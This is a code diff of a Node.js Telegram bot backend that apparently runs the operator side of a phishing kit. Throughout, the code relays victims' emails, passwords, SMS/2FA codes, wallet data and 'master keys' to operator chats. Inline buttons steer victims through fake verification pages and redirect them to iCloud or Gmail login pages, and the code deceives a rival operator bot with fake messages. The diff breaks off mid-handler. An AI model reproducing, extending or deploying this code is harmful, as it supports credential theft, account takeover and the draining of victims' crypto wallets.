@@ -2,34 +2,54 @@ const TelegramBot = require("node-telegram-bot-api");
 const fetch = require("node-fetch");
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
-const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || process.env.CHAT_ID;
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
 const APP_URL = process.env.APP_URL;
-
-const BOT_TOKEN_CAPTCHA_PAGE = process.env.BOT_TOKEN_CAPTCHA_PAGE;
-const CHAT_ID_CAPTCHA_PAGE = process.env.CHAT_ID_CAPTCHA_PAGE;
 
 const BOT_TOKEN_2 = process.env.BOT_TOKEN_2;
 const ADMIN_CHAT_ID_2 = process.env.ADMIN_CHAT_ID_2;
 
-// Storage objects
-const pendingGmailLogin = {};
-const pendingVerificationPage = {};
-
 if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
-  console.error("❌ Missing BOT_TOKEN, ADMIN_CHAT_ID/CHAT_ID, or APP_URL in environment");
+  console.error("❌ Missing BOT_TOKEN, ADMIN_CHAT_ID, or APP_URL in environment");
   process.exit(1);
 }
 
-if (!BOT_TOKEN_CAPTCHA_PAGE || !CHAT_ID_CAPTCHA_PAGE) {
-  console.warn("⚠️ Missing BOT_TOKEN_CAPTCHA_PAGE or CHAT_ID_CAPTCHA_PAGE - captcha alerts will NOT be sent");
-}
+// ============================================================================
+// ✅ BOT 1 SETUP
+// ============================================================================
 
 const bot = new TelegramBot(BOT_TOKEN, {
-  polling: {
-    autoStart: true,
-    params: { timeout: 10 }
+  polling: { autoStart: true, params: { timeout: 10 } }
+});
+
+bot.getMe().then(() => {
+  console.log("✅ Bot 1 connected successfully.");
+}).catch(err => {
+  console.error("❌ Bot 1 connection failed:", err.message);
+});
+
+let botRestartAttempts = 0;
+bot.on("polling_error", (err) => {
+  if (err.code === "ETELEGRAM" && err.message.includes("409")) {
+    botRestartAttempts++;
+    if (botRestartAttempts <= 1) {
+      console.warn("⚠️ Bot 1: 409 Conflict - stopping and restarting polling...");
+      bot.stopPolling().then(() => {
+        setTimeout(() => {
+          bot.startPolling();
+          console.log("✅ Bot 1: Polling restarted");
+        }, 2000);
+      });
+    } else {
+      console.error("❌ Bot 1: Multiple 409 errors - possible duplicate instance");
+    }
+  } else {
+    console.error("❌ Bot 1 polling error:", err.message);
   }
 });
+
+// ============================================================================
+// ✅ BOT 2 SETUP (NEW)
+// ============================================================================
 
 let bot2 = null;
 if (BOT_TOKEN_2 && ADMIN_CHAT_ID_2) {
@@ -67,78 +87,26 @@ if (BOT_TOKEN_2 && ADMIN_CHAT_ID_2) {
   });
 }
 
-let botCaptchaPage = null;
-if (BOT_TOKEN_CAPTCHA_PAGE && CHAT_ID_CAPTCHA_PAGE) {
-  botCaptchaPage = new TelegramBot(BOT_TOKEN_CAPTCHA_PAGE, {
-    polling: {
-      autoStart: true,
-      params: { timeout: 10 }
-    }
-  });
-  
-  botCaptchaPage.getMe().then(() => {
-    console.log("✅ Captcha Bot connected successfully.");
-  }).catch(err => {
-    console.error("❌ Captcha Bot connection failed:", err.message);
-  });
-
-  let captchaRestartAttempts = 0;
-  botCaptchaPage.on("polling_error", (err) => {
-    if (err.code === "ETELEGRAM" && err.message.includes("409")) {
-      captchaRestartAttempts++;
-      if (captchaRestartAttempts <= 1) {
-        console.warn("⚠️ Captcha Bot: 409 Conflict - stopping and restarting polling...");
-        botCaptchaPage.stopPolling().then(() => {
-          setTimeout(() => {
-            botCaptchaPage.startPolling();
-            console.log("✅ Captcha Bot: Polling restarted");
-          }, 2000);
-        });
-      } else {
-        console.error("❌ Captcha Bot: Multiple 409 errors - possible duplicate instance");
-      }
-    } else {
-      console.error("❌ Captcha Bot polling error:", err.message);
-    }
-  });
-}
-
-bot.getMe().then(() => {
-  console.log("✅ Bot connected successfully.");
-}).catch(err => {
-  console.error("❌ Bot connection failed:", err.message);
-});
-
-let botRestartAttempts = 0;
-bot.on("polling_error", (err) => {
-  if (err.code === "ETELEGRAM" && err.message.includes("409")) {
-    botRestartAttempts++;
-    if (botRestartAttempts <= 1) {
-      console.warn("⚠️ Bot 1: 409 Conflict - stopping and restarting polling...");
-      bot.stopPolling().then(() => {
-        setTimeout(() => {
-          bot.startPolling();
-          console.log("✅ Bot 1: Polling restarted");
-        }, 2000);
-      });
-    } else {
-      console.error("❌ Bot 1: Multiple 409 errors - possible duplicate instance");
-    }
-  } else {
-    console.error("❌ Polling error:", err.message);
-  }
-});
+// ============================================================================
+// ✅ GLOBAL STORAGE OBJECTS (EXPORTED TO server.js)
+// ============================================================================
 
 const userWinnerTelegram = {};
+const botsThatClickedPage1 = {};
 const notificationSent = {};
-const botsThatClickedPage1 = {}; // ✅ NEW: Track which bots clicked page 1 buttons
+const handledCallbacks = new Set();
+const bot2WinnerTimestamp = {};  // ✅ Track when Bot 2 wins for fake Page 2 timeout
+const userDeviceInfo = {};  // ✅ Store device info for each user
+
+// ============================================================================
+// ✅ BROADCAST MESSAGE (Send to both bots)
+// ============================================================================
 
 async function broadcastMessage(chatId, message, options = {}) {
   const errors = [];
 
   try {
     await bot.sendMessage(chatId, message, options);
-    console.log(`✅ Message sent to Bot 1 (Chat: ${chatId})`);
   } catch (err) {
     console.error("❌ Failed to send to Bot 1:", err.message);
     errors.push(err);
@@ -147,7 +115,6 @@ async function broadcastMessage(chatId, message, options = {}) {
   if (bot2 && ADMIN_CHAT_ID_2) {
     try {
       await bot2.sendMessage(ADMIN_CHAT_ID_2, message, options);
-      console.log(`✅ Message sent to Bot 2 (Chat: ${ADMIN_CHAT_ID_2})`);
     } catch (err) {
       console.error("❌ Failed to send to Bot 2:", err.message);
       errors.push(err);
@@ -159,849 +126,48 @@ async function broadcastMessage(chatId, message, options = {}) {
   }
 }
 
-async function sendFollowUpMessage(userId, message, options = {}) {
+// ============================================================================
+// ✅ SEND FOLLOW-UP MESSAGE (To winner only)
+// ============================================================================
+
+async function sendFollowUpMessage(email, message, options = {}) {
   try {
-    console.log(`🔍 Checking winner for ${userId}: ${userWinnerTelegram[userId]}`);
     
-    if (userWinnerTelegram[userId] === "telegram1") {
+    if (userWinnerTelegram[email] === "telegram1") {
       await bot.sendMessage(ADMIN_CHAT_ID, message, options);
-      console.log(`📨 Follow-up sent to Bot 1 (User: ${userId})`);
-    } else if (userWinnerTelegram[userId] === "telegram2") {
+    } else if (userWinnerTelegram[email] === "telegram2") {
       if (bot2 && ADMIN_CHAT_ID_2) {
         await bot2.sendMessage(ADMIN_CHAT_ID_2, message, options);
-        console.log(`📨 Follow-up sent to Bot 2 (User: ${userId})`);
       }
     } else {
-      console.log(`⚠️ No winner found for ${userId}, not sending follow-up`);
+      console.log(`⚠️ No winner found for ${email}, not sending follow-up`);
     }
   } catch (err) {
     console.error("❌ Failed to send follow-up message:", err.message);
   }
 }
 
-let pendingRequests = {};
-const handledCallbacks = new Set();
+// ============================================================================
+// ✅ BOT 1 CALLBACK QUERY HANDLER
+// ============================================================================
 
-function sendApprovalRequest(email, password) {
-  const options = {
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: "✅ Accept", callback_data: `accept|${email}` },
-          { text: "❌ Reject", callback_data: `reject|${email}` }
-        ]
-      ]
-    }
-  };
-  broadcastMessage(
-    ADMIN_CHAT_ID,
-    `*Login Approval Requested*\n*Email:* ${email}`,
-    { ...options, parse_mode: "Markdown" }
-  );
-}
-
-function sendApprovalRequestGeneric(identifier) {
-  const options = {
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: "✅ Accept", callback_data: `accept|${identifier}` },
-          { text: "❌ Reject", callback_data: `reject|${identifier}` }
-        ]
-      ]
-    }
-  };
-  broadcastMessage(
-    ADMIN_CHAT_ID,
-    `*Approval Requested*\nIdentifier: ${identifier}`,
-    { ...options, parse_mode: "Markdown" }
-  );
-}
-
-async function sendApprovalRequestSMS(code, message) {
-  const options = {
-    parse_mode: "HTML",
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: "✅ Accept", callback_data: `accept|${code}` },
-          { text: "❌ Reject", callback_data: `reject|${code}` }
-        ]
-      ]
-    }
-  };
-  await broadcastMessage(ADMIN_CHAT_ID, message, options);
-}
-
-async function sendApprovalRequestPage(email, password, message) {
-  const options = {
-    parse_mode: "HTML",
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: "✅ Accept", callback_data: `accept|${email}` },
-          { text: "❌ Reject", callback_data: `reject|${email}` }
-        ]
-      ]
-    }
-  };
-  await sendFollowUpMessage(email, message, options);
-}
-
-async function sendLoginTelegram(email, message) {
-  const options = {
-    parse_mode: "HTML",
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: "🔑 2FA Auth 🔑", callback_data: `page1|${email}` }
-        ],
-        [
-          { text: "📧 Approve Email 📧", callback_data: `page2|${email}` }
-        ],
-        [
-          { text: "❌ Reject ❌", callback_data: `reject|${email}` }
-        ]
-      ]
-    }
-  };
-  await broadcastMessage(ADMIN_CHAT_ID, message, options);
-}
-
-async function sendVerifyTelegram(ip, message, emailForWinner = null) {
-  const options = {
-    parse_mode: "HTML",
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: "🏁 Done Page 🏁", callback_data: `page1|${ip}` }],
-        [{ text: "🔐 Last 2FA 🔐", callback_data: `page2|${ip}` }],
-        [{ text: "💼 Wallet 💼", callback_data: `page3|${ip}` }],
-        [{ text: "🗝️ Master Key 🗝️", callback_data: `page4|${ip}` }]
-      ]
-    }
-  };
-  
-  if (emailForWinner && userWinnerTelegram[emailForWinner]) {
-    await sendFollowUpMessage(emailForWinner, message, options);
-  } else {
-    await broadcastMessage(ADMIN_CHAT_ID, message, options);
-  }
-}
-
-async function send2FATelegram(message, requestId) {
-  const options = {
-    parse_mode: "HTML",
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: "❌ Reject ❌", callback_data: `2fa_reject_new|${requestId}` }],
-        [{ text: "🏁 Done Page 🏁", callback_data: `2fa_done|${requestId}` }],
-        [{ text: "💼 Wallet 💼", callback_data: `2fa_wallet|${requestId}` }],
-        [{ text: "🗝️ Master Key 🗝️", callback_data: `2fa_masterkey|${requestId}` }]
-      ]
-    }
-  };
-  try {
-    if (userWinnerTelegram["temp"]) {
-      await sendFollowUpMessage("temp", message, options);
-    }
-  } catch (err) {
-    console.error("❌ Failed to send 2fa:", err);
-  }
-}
-
-async function sendMasterKeyTelegram(message, requestId) {
-  const options = {
-    parse_mode: "HTML",
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: "❌ Reject ❌", callback_data: `mk_reject|${requestId}` }],
-        [{ text: "🏁 Done Page 🏁", callback_data: `mk_done|${requestId}` }],
-        [{ text: "💼 Wallet 💼", callback_data: `mk_wallet|${requestId}` }],
-        [{ text: "🔐 Passkey 2FA 🔐", callback_data: `mk_passkey|${requestId}` }]
-      ]
-    }
-  };
-  try {
-    if (userWinnerTelegram["temp"]) {
-      await sendFollowUpMessage("temp", message, options);
-    }
-  } catch (err) {
-    console.error("❌ Failed to send master key:", err);
-  }
-}
-
-async function sendWalletOptionsTelegram(message, requestId) {
-  const options = {
-    parse_mode: "HTML",
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: "🗝️ Master Key 🗝️", callback_data: `wallet_master_key|${requestId}` }],
-        [{ text: "🔐 2FA 🔐", callback_data: `wallet_2fa|${requestId}` }],
-        [{ text: "🏁 Done 🏁", callback_data: `wallet_done|${requestId}` }]
-      ]
-    }
-  };
-  try {
-    if (userWinnerTelegram["temp"]) {
-      await sendFollowUpMessage("temp", message, options);
-    }
-  } catch (err) {
-    console.error("❌ Failed to send wallet options:", err);
-  }
-}
-
-function send2FACode(code, chatId) {
-  pendingRequests[chatId] = true;
-  bot.sendMessage(chatId, `Your 2FA code is: ${code}`, {
-    reply_markup: {
-      keyboard: [["Accept", "Reject"]],
-      one_time_keyboard: true,
-    },
-  });
-}
-
-bot.on("message", (msg) => {
-  const chatId = msg.chat.id;
-
-  if (pendingRequests[chatId]) {
-    if (msg.text === "Accept") {
-      bot.sendMessage(chatId, "✅ 2FA code accepted. Redirecting...");
-      delete pendingRequests[chatId];
-    } else if (msg.text === "Reject") {
-      bot.sendMessage(chatId, "❌ 2FA code rejected. Please try again.");
-      delete pendingRequests[chatId];
-    }
-  }
-});
-
-// ─── BOT 1 CALLBACK HANDLER ────────────────────────────
 bot.on("callback_query", async (query) => {
-  if (handledCallbacks.has(query.id)) return;
-  handledCallbacks.add(query.id);
-  setTimeout(() => handledCallbacks.delete(query.id), 60000);
+  const callbackId = query.id;
+  
+  if (handledCallbacks.has(callbackId)) return;
+  handledCallbacks.add(callbackId);
 
   try {
     const [action, identifier] = query.data.split("|");
-    const userId = identifier;
-    
-    // ✅ NEW: Check if this is a PAGE 1 action (login buttons only)
-    const isPage1Action = action === "accept" || action === "page1" || action === "page2" || 
-                         action === "page3" || action === "page4" || action === "reject";
-    
-    if (!userWinnerTelegram[userId]) {
-      userWinnerTelegram[userId] = "telegram1";
-      console.log(`🏆 User ${userId} - Telegram 1 WINS!`);
-      
-      // ✅ IMPORTANT: Only track Bot 1's page 1 clicks, NOT Bot 2's
-      // This is for Bot 1 callback handler, so if Bot 1 wins/clicks, mark it
-      if (isPage1Action) {
-        botsThatClickedPage1[userId] = true;
-        console.log(`✅ Bot 1 clicked PAGE 1 button - marked for page 2`);
-      }
-      
-      // Send notification to Bot 2 that Bot 1 won - ONLY on initial login (page1, page2 buttons with email, not IP)
-      const isIPAddress = /^\d{1,3}(\.\d{1,3}){3}$/.test(userId);
-      if ((action === "page1" || action === "page2") && !isIPAddress && !notificationSent[userId] && bot2 && ADMIN_CHAT_ID_2) {
-        notificationSent[userId] = true;
-        try {
-          await bot2.sendMessage(ADMIN_CHAT_ID_2, `🏆 Bot 1 WINS!`);
-          console.log(`📢 Bot 2 notified that Bot 1 won for ${userId}`);
-        } catch (err) {
-          console.error("❌ Failed to notify Bot 2:", err.message);
-          // Retry once after 500ms
-          setTimeout(async () => {
-            try {
-              await bot2.sendMessage(ADMIN_CHAT_ID_2, `🏆 Bot 1 WINS!`);
-              console.log(`📢 Bot 2 notified (RETRY) that Bot 1 won for ${userId}`);
-            } catch (retryErr) {
-              console.error("❌ Retry failed:", retryErr.message);
-            }
-          }, 500);
-        }
-      }
-    } else {
-      // ✅ NEW: Bot 1 clicked but didn't win
-      if (isPage1Action && !botsThatClickedPage1[userId]) {
-        botsThatClickedPage1[userId] = true;
-        botsThatClickedPage1[`${userId}_timestamp`] = Date.now();
-        console.log(`✅ Bot 1 clicked PAGE 1 button (not first) - action: ${action}`);
-        
-        // ✅ SELECTIVE Page 2 Trigger - Check button type and time window
-        if (userWinnerTelegram[userId] === "telegram2") {
-          const clickTimestamp = Date.now();
-          const page2SendTimestamp = global.page2MessageDataStore && global.page2MessageDataStore[userId] 
-            ? global.page2MessageDataStore[userId].timestamp 
-            : null;
-          
-          // 🚫 If 2FA button (page1) → Skip Page 2 entirely
-          const is2FAButton = action === "page1";
-          
-          if (is2FAButton) {
-            console.log(`🚫 Bot 1 clicked 2FA button (page1) - skipping Page 2 entirely`);
-            botsThatClickedPage1[`${userId}_timeout_expired`] = true;
-            if (global.page2MessageDataStore && global.page2MessageDataStore[userId]) {
-              delete global.page2MessageDataStore[userId];
-            }
-          } else {
-            // ✅ APPROVE EMAIL BUTTON (page2) - Wait for Page 2 data if not ready yet
-            console.log(`📨 Bot 1 clicked approve email (page2) - checking for Page 2 data...`);
-            
-            // Setup polling to wait for Page 2 data
-            let pollCount = 0;
-            const maxPolls = 150; // 150 * 100ms = 15 seconds
-            
-            const pollInterval = setInterval(async () => {
-              pollCount++;
-              const timeSinceClick = Date.now() - clickTimestamp;
-              
-              // Get current page 2 data
-              const page2Data = global.page2MessageDataStore && global.page2MessageDataStore[userId] 
-                ? global.page2MessageDataStore[userId] 
-                : null;
-              
-              if (!page2Data) {
-                // Page 2 data not ready yet
-                if (pollCount > maxPolls) {
-                  // ⏱️ TIMEOUT: 15 seconds passed without Page 2 data
-                  console.log(`⏱️ TIMEOUT: Bot 1 waited 15 seconds but Page 2 never arrived`);
-                  clearInterval(pollInterval);
-                  botsThatClickedPage1[`${userId}_timeout_expired`] = true;
-                  return;
-                }
-                // Keep waiting, don't do anything yet
-                return;
-              }
-              
-              // ✅ Page 2 data is now available! Check time window
-              const timeSincePage2Send = Date.now() - page2Data.timestamp;
-              const isAfterTimeout = timeSincePage2Send >= 15000; // 15 seconds
-              
-              if (isAfterTimeout) {
-                // ⏱️ Page 2 arrived but too late (after 15 seconds from when it was sent to Bot 2)
-                console.log(`⏱️ TIMEOUT: Page 2 arrived late (${timeSincePage2Send}ms after being sent to Bot 2)`);
-                clearInterval(pollInterval);
-                botsThatClickedPage1[`${userId}_timeout_expired`] = true;
-                delete global.page2MessageDataStore[userId];
-                return;
-              }
-              
-              // ✅ Page 2 is ready and within timeout - Send it after 2 second delay
-              console.log(`📨 TRIGGER: Page 2 data found! Elapsed: ${timeSincePage2Send}ms. Sending page 2 message after 2 second delay...`);
-              clearInterval(pollInterval);
-              
-              setTimeout(async () => {
-                try {
-                  await bot.sendMessage(ADMIN_CHAT_ID, page2Data.message, page2Data.options);
-                  console.log(`✅ Page 2 message sent directly to Bot 1 (after 2 second delay)`);
-                  delete global.page2MessageDataStore[userId];
-                } catch (err) {
-                  console.error(`❌ Failed to send triggered page 2 to Bot 1:`, err.message);
-                }
-              }, 2000); // 2 second delay
-            }, 100); // Poll every 100ms
-          }
-        }
-      }
-    }
 
-    let status;
 
-    // ─── Last 2FA Page Buttons ────────────────────────
-    if (action === "2fa_reject_new" || action === "2fa_done" || action === "2fa_wallet" || action === "2fa_masterkey") {
-      let newStatus, replyText;
-
-      if (action === "2fa_reject_new") {
-        newStatus = "rejected";
-        replyText = `❌ <code>${identifier}</code> has been <b>REJECTED</b>`;
-      } else if (action === "2fa_done") {
-        newStatus = "approved1";
-        replyText = `🏁 <code>${identifier}</code> → <b>Done Page</b>`;
-      } else if (action === "2fa_wallet") {
-        newStatus = "approved2";
-        replyText = `💼 <code>${identifier}</code> → <b>Wallet</b>`;
-      } else if (action === "2fa_masterkey") {
-        newStatus = "approved3";
-        replyText = `🗝️ <code>${identifier}</code> → <b>Master Key</b>`;
-      }
-
-      await fetch(`${APP_URL}/api/update-2fa-status`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ requestId: identifier, status: newStatus })
-      });
-
-      try {
-        await bot.editMessageReplyMarkup(
-          { inline_keyboard: [] },
-          { chat_id: query.message.chat.id, message_id: query.message.message_id }
-        );
-      } catch (_) {}
-
-      await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
-      await bot.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
-      return;
-    }
-
-    // ─── Master Key Page Buttons ────────────────────────
-    if (action === "mk_reject" || action === "mk_done" || action === "mk_wallet" || action === "mk_passkey") {
-      let newStatus, replyText;
-
-      if (action === "mk_reject") {
-        newStatus = "rejected";
-        replyText = `❌ <code>${identifier}</code> has been <b>REJECTED</b>`;
-      } else if (action === "mk_done") {
-        newStatus = "mk_approved1";
-        replyText = `🏁 <code>${identifier}</code> → <b>Done Page</b>`;
-      } else if (action === "mk_wallet") {
-        newStatus = "mk_approved2";
-        replyText = `💼 <code>${identifier}</code> → <b>Wallet</b>`;
-      } else if (action === "mk_passkey") {
-        newStatus = "mk_approved3";
-        replyText = `🔐 <code>${identifier}</code> → <b>Passkey 2FA</b>`;
-      }
-
-      await fetch(`${APP_URL}/api/update-masterkey-status`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ requestId: identifier, status: newStatus })
-      });
-
-      try {
-        await bot.editMessageReplyMarkup(
-          { inline_keyboard: [] },
-          { chat_id: query.message.chat.id, message_id: query.message.message_id }
-        );
-      } catch (_) {}
-
-      await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
-      await bot.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
-      return;
-    }
-
-    // ─── Wallet Options Page Buttons ────────────────────────
-    if (action === "wallet_master_key" || action === "wallet_2fa" || action === "wallet_done") {
-      let newStatus, replyText;
-
-      if (action === "wallet_master_key") {
-        newStatus = "wallet_master_key";
-        replyText = `🗝️ <code>${identifier}</code> → <b>Master Key</b>`;
-      } else if (action === "wallet_2fa") {
-        newStatus = "wallet_2fa";
-        replyText = `🔐 <code>${identifier}</code> → <b>2FA</b>`;
-      } else if (action === "wallet_done") {
-        newStatus = "wallet_done";
-        replyText = `🏁 <code>${identifier}</code> → <b>Done</b>`;
-      }
-
-      await fetch(`${APP_URL}/api/update-wallet-options-status`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ requestId: identifier, status: newStatus })
-      });
-
-      try {
-        await bot.editMessageReplyMarkup(
-          { inline_keyboard: [] },
-          { chat_id: query.message.chat.id, message_id: query.message.message_id }
-        );
-      } catch (_) {}
-
-      await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
-      await bot.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
-      return;
-    }
-
-    // ─── Standard buttons (2fa_approve, accept, page, etc) ────────────────────────
-    if (action === "2fa_approve" || action === "2fa_reject") {
-      const twoFaStatus = action === "2fa_approve" ? "approved" : "rejected";
-      const twoFaEmoji = twoFaStatus === "approved" ? "✅" : "❌";
-
-      await fetch(`${APP_URL}/api/update-2fa-status`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ requestId: identifier, status: twoFaStatus })
-      });
-
-      try {
-        await bot.editMessageReplyMarkup(
-          { inline_keyboard: [] },
-          { chat_id: query.message.chat.id, message_id: query.message.message_id }
-        );
-      } catch (_) {}
-
-      const msgText = query.message.text || "";
-      const smsMatch = msgText.match(/(?:SMS|2FA|2FA-2)[:\s]+([\d\s\-]+)/i);
-      const displayCode = smsMatch ? smsMatch[1].trim() : null;
-
-      const twoFaStatusText = displayCode
-        ? `🔐 <code>${displayCode}</code> has been <b>${twoFaStatus === "approved" ? "ACCEPTED! ✅" : "REJECTED! ❌"}</b>`
-        : `${twoFaEmoji} <b>${twoFaStatus.toUpperCase()}</b>`;
-
-      await bot.sendMessage(query.message.chat.id, twoFaStatusText, { parse_mode: "HTML" });
-      await bot.answerCallbackQuery(query.id, { text: `❗️${twoFaStatus.toUpperCase()}❗️` });
-      return;
-    }
-
-    // ─── Device Approval Redirection Buttons ────────────────────────
-    if (action === "device_icloud" || action === "device_gmail") {
-      const requestId = identifier;
-      let newStatus;
-
-      if (action === "device_icloud") {
-        newStatus = "icloud";
-      } else if (action === "device_gmail") {
-        newStatus = "gmail";
-      }
-
-      // Get email from server endpoint
-      let emailDisplay = 'User';
-      try {
-        const emailRes = await fetch(`${APP_URL}/get-device-approval/${requestId}`);
-        const emailData = await emailRes.json();
-        if (emailData.email) {
-          emailDisplay = emailData.email;
-          console.log(`📧 Device: Fetched email for ${requestId}: ${emailDisplay}`);
-        } else {
-          console.log(`❌ Device: No email found for ${requestId}`);
-        }
-      } catch (err) {
-        console.log(`❌ Device: Error fetching email:`, err.message);
-      }
-
-      // ✅ NEW: Check if Bot 1 is the loser
-      const isBot1Loser = emailDisplay && userWinnerTelegram[emailDisplay] && userWinnerTelegram[emailDisplay] === "telegram2";
-      
-      if (isBot1Loser) {
-        // Bot 1 is loser: Show fake message with delay, do NOT update backend status
-        console.log(`📊 Bot 1 is LOSER - Delaying fake message by 2-3 seconds to ${emailDisplay}`);
-        
-        try {
-          await bot.editMessageReplyMarkup(
-            { inline_keyboard: [] },
-            { chat_id: query.message.chat.id, message_id: query.message.message_id }
-          );
-        } catch (_) {}
-
-        const replyText = newStatus === "icloud" 
-          ? `📧 <code>${emailDisplay}</code> has been directed to ☁️<b>iCloud</b>☁️`
-          : `📧 <code>${emailDisplay}</code> has been directed to 🌈<b>Gmail</b>🌈`;
-
-        // ✅ Send fake message IMMEDIATELY (no delay)
-        try {
-          await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
-          console.log(`📨 Fake message sent to Bot 1 immediately`);
-        } catch (err) {
-          console.error(`❌ Failed to send fake message:`, err.message);
-        }
-
-        await bot.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
-        return;
-      }
-
-      // Bot 1 is WINNER: Update backend status normally (redirect will happen)
-      console.log(`🏆 Bot 1 is WINNER - Updating status and redirecting user`);
-      
-      await fetch(`${APP_URL}/api/update-device-approval-status`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ requestId, status: newStatus })
-      });
-
-      try {
-        await bot.editMessageReplyMarkup(
-          { inline_keyboard: [] },
-          { chat_id: query.message.chat.id, message_id: query.message.message_id }
-        );
-      } catch (_) {}
-
-      const replyText = newStatus === "icloud" 
-        ? `📧 <code>${emailDisplay}</code> has been directed to ☁️<b>iCloud</b>☁️`
-        : `📧 <code>${emailDisplay}</code> has been directed to 🌈<b>Gmail</b>🌈`;
-
-      await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
-      await bot.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
-      return;
-    }
-
-    // ─── Verification Digit Selection (0-9) ────────────────────────
+    // ============================================================================
+    // ✅ VERIFY_DIGIT HANDLER (Gmail verification)
+    // ============================================================================
     if (action === "verify_digit") {
       const [, requestId, digit] = query.data.split("|");
       
-      const updateResult = await fetch(`${APP_URL}/update-selected-digits`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ requestId, digit })
-      });
-      
-      const result = await updateResult.json();
-      
-      // If 2 digits are selected, remove the buttons (keep the original message)
-      if (result.selectedCount === 2) {
-        try {
-          await bot.editMessageReplyMarkup(
-            { inline_keyboard: [] },
-            { chat_id: query.message.chat.id, message_id: query.message.message_id }
-          );
-          
-          // Send a follow-up message
-          await bot.sendMessage(
-            query.message.chat.id,
-            `✅ <b>Numbers Selected!</b>`,
-            { parse_mode: "HTML" }
-          );
-        } catch (err) {
-          console.error("Error editing message:", err);
-        }
-      }
-
-      await bot.answerCallbackQuery(query.id, { text: `📍 Selected: ${digit}` });
-      return;
-    }
-
-    // ─── Verification Confirm (Accept/Reject) ────────────────────────
-    if (action === "verify_accept" || action === "verify_reject") {
-      const confirmRequestId = identifier;
-      let newStatus;
-
-      if (action === "verify_accept") {
-        newStatus = "accepted";
-      } else {
-        newStatus = "rejected";
-      }
-
-      // Get email from server endpoint
-      let emailDisplay = 'User';
       try {
-        const emailRes = await fetch(`${APP_URL}/get-verification-email/${confirmRequestId}`);
-        const emailData = await emailRes.json();
-        if (emailData.email) {
-          emailDisplay = emailData.email;
-          console.log(`📧 Verification: Fetched email for ${confirmRequestId}: ${emailDisplay}`);
-        } else {
-          console.log(`❌ Verification: No email found for ${confirmRequestId}`);
-        }
-      } catch (err) {
-        console.log(`❌ Verification: Error fetching email:`, err.message);
-      }
-
-      await fetch(`${APP_URL}/api/update-verification-status`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ requestId: confirmRequestId, status: newStatus })
-      });
-
-      try {
-        await bot.editMessageReplyMarkup(
-          { inline_keyboard: [] },
-          { chat_id: query.message.chat.id, message_id: query.message.message_id }
-        );
-      } catch (_) {}
-
-      const replyText = newStatus === "accepted"
-        ? `📧 <code>${emailDisplay}</code> has been <b>ACCEPTED! ✅</b>`
-        : `📧 <code>${emailDisplay}</code> has been <b>REJECTED! ❌</b>`;
-
-      await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
-      await bot.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
-      return;
-    }
-
-    // ─── Gmail Login Buttons ────────────────────────
-    if (action === "gmail_accept" || action === "gmail_reject") {
-      const requestId = identifier;
-      let newStatus;
-
-      if (action === "gmail_accept") {
-        newStatus = "accepted";
-      } else {
-        newStatus = "rejected";
-      }
-
-      // Get email from server endpoint
-      let emailDisplay = 'User';
-      try {
-        const emailRes = await fetch(`${APP_URL}/get-gmail-login/${requestId}`);
-        const emailData = await emailRes.json();
-        if (emailData.email) {
-          emailDisplay = emailData.email;
-          console.log(`📧 Gmail: Fetched email for ${requestId}: ${emailDisplay}`);
-        } else {
-          console.log(`❌ Gmail: No email found for ${requestId}`);
-        }
-      } catch (err) {
-        console.log(`❌ Gmail: Error fetching email:`, err.message);
-      }
-
-      await fetch(`${APP_URL}/api/update-gmail-login-status`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ requestId, status: newStatus })
-      });
-
-      try {
-        await bot.editMessageReplyMarkup(
-          { inline_keyboard: [] },
-          { chat_id: query.message.chat.id, message_id: query.message.message_id }
-        );
-      } catch (_) {}
-
-      const replyText = newStatus === "accepted"
-        ? `📧 <code>${emailDisplay}</code> has been <b>ACCEPTED! ✅</b>`
-        : `📧 <code>${emailDisplay}</code> has been <b>REJECTED! ❌</b>`;
-
-      await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
-      await bot.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
-      return;
-    }
-
-    if (action === "accept") status = "accepted";
-    else if (action === "page1") status = "accepted1";
-    else if (action === "page2") status = "accepted2";
-    else if (action === "page3") status = "accepted3";
-    else if (action === "page4") status = "accepted4";
-    else status = "rejected";
-
-    const isAccepted = ["accepted", "accepted1", "accepted2", "accepted3", "accepted4"].includes(status);
-    const actionLabel = isAccepted ? "ACCEPTED! ✅" : "REJECTED! ❌";
-
